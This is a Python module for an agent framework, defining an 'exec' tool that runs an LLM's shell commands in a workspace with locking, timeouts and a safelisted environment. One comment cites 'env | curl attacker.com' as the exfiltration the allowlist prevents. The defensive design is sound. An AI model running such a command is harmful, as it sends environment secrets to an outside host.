"""``exec`` -- run a shell command inside the workspace.

Module name is ``exec_`` (with a trailing underscore) because ``exec``
is a Python builtin function. The tool's ``id`` is still ``"exec"``,
which is what the LLM sees.
"""

from __future__ import annotations

import asyncio
import contextlib
import os
from pathlib import Path
from typing import ClassVar, Literal

from pydantic import BaseModel, Field

from primer.model.chat import ToolExample
from primer.model.except_ import BadRequestError, NotFoundError
from primer.workspace._locks import WorkspaceLockTable
from primer.workspace.tool import ToolCallContext, ToolResult, WorkspaceTool
from primer.workspace.local.tools._common import resolve_workspace_path


_DEFAULT_TIMEOUT_MS = 120_000


class ExecArgs(BaseModel):
    """Arguments for the ``exec`` tool."""

    command: str = Field(
        ...,
        min_length=1,
        description="Command line; passed as a single string to a shell.",
    )
    workdir: str = Field(
        default=".",
        description="Working directory relative to the workspace root.",
    )
    timeout_ms: int = Field(
        default=_DEFAULT_TIMEOUT_MS,
        gt=0,
        description="Hard timeout in milliseconds.",
    )
    background: bool = Field(
        default=False,
        description=(
            "Spawn the process and return immediately. Background mode "
            "is reserved for a future iteration; setting True today "
            "raises BadRequestError."
        ),
    )
    description: str = Field(
        ...,
        min_length=1,
        description="One-line description of what the command does.",
    )
    access: Literal["read", "write"] = Field(
        default="write",
        description=(
            "Declared filesystem intent. 'write' (default) serializes this "
            "command against other writers in the same workdir; 'read' skips "
            "the write-lock so read-only commands stay fully parallel. "
            "Declaring 'read' wrongly is never worse than today's baseline."
        ),
    )
    writes: list[str] | None = Field(
        default=None,
        description=(
            "Optional list of paths/globs this command writes. When given, "
            "the lock narrows to those paths instead of the whole workdir "
            "subtree, for maximum parallelism."
        ),
    )


class Exec(WorkspaceTool):
    """Run a shell command.

    Foreground output: ``<exit code>\\n<stdout>\\n<stderr>``. Subject to
    the workspace's outer truncation policy via the runtime.

    On timeout: kills the process, raises :class:`BadRequestError`.

    Background mode is not yet implemented (per spec: "a separate
    ``exec_status(pid)`` companion -- TBD in implementation"). Today
    it raises :class:`BadRequestError`.
    """

    id: ClassVar[str] = "exec"
    description: ClassVar[str] = (
        "Run a shell command in the workspace. Returns "
        "<exit code>\\n<stdout>\\n<stderr>. Use the optional "
        "timeout_ms to bound runtime.\n\n"
        "Use when you need to run a program or inspect the environment; "
        "not for reading one file (use ``read``)."
    )
    examples: ClassVar[list[ToolExample]] = [
        ToolExample(
            args={
                "command": "pytest -q",
                "timeout_ms": 60000,
                "description": "run the test suite",
            },
            returns="0\\n...passed",
        ),
        ToolExample(
            args={
                "command": "ls",
                "workdir": "src",
                "description": "list src",
            },
            returns="0\\nfoo.py\\n",
        ),
    ]

    def __init__(
        self,
        workspace_root: Path,
        *,
        env: dict[str, str] | None = None,
        locks: WorkspaceLockTable | None = None,
        strict: bool = False,
    ) -> None:
        """Construct.

        ``env`` -- if provided, these variables are merged on top of
        the current process environment for every spawned shell. Pass
        ``None`` (the default) to inherit the current environment
        unchanged. Used by :class:`LocalWorkspace` to inject the
        ``WorkspaceTemplate.env`` overrides.

        ``locks`` -- the shared per-workspace lock table. When supplied,
        a writing exec acquires the Tier-B lock around the subprocess (the
        workdir scope, or the sorted declared ``writes`` paths); a
        ``access="read"`` exec takes nothing so read-only commands stay
        fully parallel. ``strict`` collapses the workdir scope key to the
        workspace root instead of the per-workdir subtree.
        """
        self._root = Path(workspace_root)
        self._env = env
        self._locks = locks
        self._strict = strict

    def parameters(self) -> type[BaseModel]:
        return ExecArgs

    def _exec_lock_ctx(self, args: "ExecArgs", cwd: Path):
        """Choose the Tier-B lock context for one exec call.

        - ``access="read"`` (or no lock table): no lock -- fully parallel.
        - declared ``writes``: sorted per-path locks (``hold_paths``).
        - otherwise: the workdir scope lock (``hold_scope``), whose key is
          derived IDENTICALLY to the write / edit tool's Tier-A scope key so
          a same-directory write and exec serialize on the shared scope lock.
        """
        if self._locks is None or args.access == "read":
            return contextlib.nullcontext()
        if args.writes:
            resolved = [
                str(resolve_workspace_path(self._root, w)) for w in args.writes
            ]
            return self._locks.hold_paths(resolved)
        scope = str(self._root.resolve()) if self._strict else str(cwd)
        return self._locks.hold_scope(scope)

    async def execute(self, args: BaseModel, ctx: ToolCallContext) -> ToolResult:
        del ctx
        assert isinstance(args, ExecArgs)
        if args.background:
            raise BadRequestError(
                "background=true is not yet supported; "
                "see exec_status companion (TBD in spec)"
            )
        cwd = resolve_workspace_path(self._root, args.workdir)
        if not cwd.exists():
            raise NotFoundError(f"workdir {args.workdir!r} not found")
        if not cwd.is_dir():
            raise BadRequestError(f"workdir {args.workdir!r} is not a directory")

        # Build a minimal, explicit environment for the subprocess.
        # Inheriting the API server's full environment via env=None would
        # leak provider API keys and database credentials to whatever
        # command an LLM-driven agent decides to run. We allow only a
        # short list of variables required for shells / tools to function,
        # plus whatever the workspace template supplied.
        proc_env: dict[str, str] = _curated_subprocess_env()
        if self._env is not None:
            proc_env.update(self._env)
        # Tier-B: hold the write lock for the whole subprocess lifetime so a
        # writing command serializes against same-scope tool writes / execs.
        async with self._exec_lock_ctx(args, cwd):
            proc = await asyncio.create_subprocess_shell(
                args.command,
                cwd=str(cwd),
                env=proc_env,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            try:
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(),
                    timeout=args.timeout_ms / 1000.0,
                )
            except TimeoutError as exc:
                try:
                    proc.kill()
                except ProcessLookupError:
                    pass
                await proc.wait()
                raise BadRequestError(
                    f"command timed out after {args.timeout_ms}ms: {args.command!r}"
                ) from exc

        rc = proc.returncode if proc.returncode is not None else -1
        out_text = stdout.decode("utf-8", errors="replace")
        err_text = stderr.decode("utf-8", errors="replace")
        body = f"{rc}\n{out_text}\n{err_text}"
        return ToolResult(
            output=body,
            metadata={
                "exit_code": rc,
                "command": args.command,
                "workdir": args.workdir,
            },
        )


# ===========================================================================
# Helpers
# ===========================================================================


# Variables we copy from the parent process when constructing the
# subprocess environment. Anything outside this set (notably API keys,
# DB credentials, and other application secrets) is dropped so an LLM
# command like ``env | curl attacker.com`` cannot exfiltrate them.
_ENV_PASSTHROUGH = frozenset({
    "PATH",
    "HOME",
    "USER",
    "USERNAME",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "TZ",
    "TMPDIR",
    "TEMP",
    "TMP",
    "PWD",
    "SHELL",
    "TERM",
    # Windows-specific essentials.
    "SystemRoot",
    "SYSTEMROOT",
    "ComSpec",
    "COMSPEC",
    "PATHEXT",
    "WINDIR",
    "USERPROFILE",
    "APPDATA",
    "LOCALAPPDATA",
    "PROGRAMDATA",
    "PROGRAMFILES",
    "ProgramFiles",
    "ProgramFiles(x86)",
})


def _curated_subprocess_env() -> dict[str, str]:
    """Copy only the safelisted variables from the parent environment."""
    return {k: v for k, v in os.environ.items() if k in _ENV_PASSTHROUGH}


__all__ = ["Exec", "ExecArgs"]
